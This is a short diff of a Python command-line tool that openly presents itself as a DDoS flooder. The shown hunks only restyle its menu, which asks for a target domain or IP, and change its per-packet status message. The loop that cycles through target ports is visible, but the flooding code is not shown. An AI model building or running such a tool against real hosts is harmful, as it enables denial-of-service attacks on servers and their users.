@@ -64,8 +64,8 @@ def ddos():
             banner()
             print (" ")
             print (" ")
-            print(Fore.GREEN+Style.BRIGHT+"1 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with Domin site "+Fore.GREEN+Style.BRIGHT+"\n\n2 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with IP site ")
-            opt=str(input(Fore.RED+Style.BRIGHT+"\nnenter number for DDOS ? "+Fore.RESET))
+            print(Fore.GREEN+Style.BRIGHT+"  1 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with Domin site "+Fore.GREEN+Style.BRIGHT+"\n\n  2 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with IP site ")
+            opt=str(input(Fore.RED+Style.BRIGHT+"\n\n nenter number for DDOS ? "+Fore.RESET))
             if opt=='1':
                 domain=str(input(Fore.CYAN+Style.BRIGHT+" enter domin terget site : "+Fore.RESET))
                 ip=socket.gethostbyname(domain)
@@ -105,7 +105,7 @@ def ddos():
             color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
             color_random = random.choice(color_list)
 
-            print(color_random+"Send DDos to server" % (sent, ip, port))
+            print(color_random+"aquete %sP enviado %s a través del puerto:%s" % (sent, ip, port))
             if port==65534:
                 port=1
             elif port==1900:
